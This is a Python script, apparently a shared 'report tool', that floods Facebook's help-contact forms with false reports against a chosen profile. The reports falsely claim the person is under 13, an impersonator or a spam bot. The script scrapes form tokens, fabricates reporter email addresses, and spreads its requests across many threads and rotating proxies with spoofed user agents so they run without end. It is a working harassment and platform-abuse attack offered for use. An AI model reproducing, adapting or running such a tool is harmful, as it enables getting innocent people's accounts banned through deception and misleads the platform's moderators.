import requests
import random
import threading
import time
import sys
import os
import re
G = '\033[1;32m'
R = '\033[1;31m'
W = '\033[1;37m'
Y = '\033[1;33m'
B = '\033[1;34m'
C = '\033[1;36m'
RESET = '\033[0m'
LOGO = f""" 
{B}         >> PROFESSIONAL REPORT TOOL <<
{W}      User: {G}@WHI3PER {W}| Version: {Y}3.0 FINAL{RESET}
"""
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def fetch_free_proxies():
    print(f"{Y} [!] Fetching free proxies...{RESET}")
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        res = requests.get(url, timeout=10)
        return res.text.strip().split('\n')
    except:
        return []
FORMS = {
    "1": {"id": "209046679279097", "tag": "UNDERAGE", "msg": "Child under 13 years old."},
    "2": {"id": "169486816475808", "tag": "FAKE-IMP", "msg": "Impersonation and fake identity."},
    "3": {"id": "274459462613911", "tag": "SPAM-BOT", "msg": "Automated spam bot profile."}
}
clear()
print(LOGO)
target_id = input(f' {B}[{W}+{B}] {W}Target ID   : {G}')
target_name = input(f' {B}[{W}+{B}] {W}Target Name : {G}')
threads_limit = int(input(f' {B}[{W}+{B}] {W}Threads     : {G}'))
print(f"\n{C} [ PROXY OPTIONS ]")
print(f"{W} [1] Use proxies.txt")
print(f"{W} [2] Use Free Proxies (Auto)")
print(f"{W} [3] Direct (No Proxy)")
proxy_choice = input(f" {B}[{W}?{B}] {W}Choice: {G}")
PROXIES = []
if proxy_choice == "1":
    if os.path.exists('proxies.txt'):
        with open('proxies.txt', 'r') as f:
            PROXIES = [line.strip() for line in f if line.strip()]
elif proxy_choice == "2":
    PROXIES = fetch_free_proxies()
print(f"\n{C} [ REPORT OPTIONS ]")
print(f"{W} [1] Underage")
print(f"{W} [2] Impersonation")
print(f"{W} [3] Fake Account")
print(f"{W} [4] Random Mix (ALL)")
report_choice = input(f" {B}[{W}?{B}] {W}Choice: {G}")
AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
]
def attack(tid):
    sess = requests.Session()
    sent = 0
    while True:
        try:
            px_map = None
            if PROXIES:
                proxy = random.choice(PROXIES)
                px_map = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            if report_choice == "4":
                form = random.choice(list(FORMS.values()))
            else:
                form = FORMS.get(report_choice, FORMS["1"])
            sess.headers.update({"User-Agent": random.choice(AGENTS)})
            url = f"https://mbasic.facebook.com/help/contact/{form['id']}"
            r1 = sess.get(url, proxies=px_map, timeout=8)
            
            if "lsd" in r1.text:
                lsd = re.search(r'name="lsd" value="(.*?)"', r1.text).group(1)
                jaz = re.search(r'name="jazoest" value="(.*?)"', r1.text).group(1) 
                mail = f"review.{random.randint(1000,99999)}@gmail.com"
                data = {
                    "lsd": lsd, "jazoest": jaz,
                    "crt_url": f"https://www.facebook.com/profile.php?id={target_id}",
                    "crt_name": target_name, "cf_age": "12 years",
                    "Field255260417881843": form['msg'],
                    "Field166040066844792": mail,
                    "form_id": form['id'], "support_form_id": form['id']
                }
                r2 = sess.post('https://mbasic.facebook.com/a/help/contact_us/', data=data, proxies=px_map, timeout=8)
                
                if r2.status_code == 200:
                    sent += 1
                    p_info = proxy[:12] if PROXIES else "Direct"
                    print(f" {W}[{C}Thread-{tid}{W}] {G}Success #{sent} {W}| {Y}{form['tag']} {W}| {B}{p_info}{RESET}", flush=True)  
        except:
            pass
        time.sleep(0.1)
clear()
print(LOGO)
print(f" {G}[!] Target : {target_name} ({target_id})")
print(f" {G}[!] Method : {'Mixed' if report_choice == '4' else 'Single Form'}")
print(f" {G}[!] Status : Attacking...\n {W}{'-'*55}")
for i in range(1, threads_limit + 1):
    threading.Thread(target=attack, args=(i,), daemon=True).start()
try:
    while True: time.sleep(0.1)
except KeyboardInterrupt:
    print(f"\n{R} [!] Stopped. {RESET}")
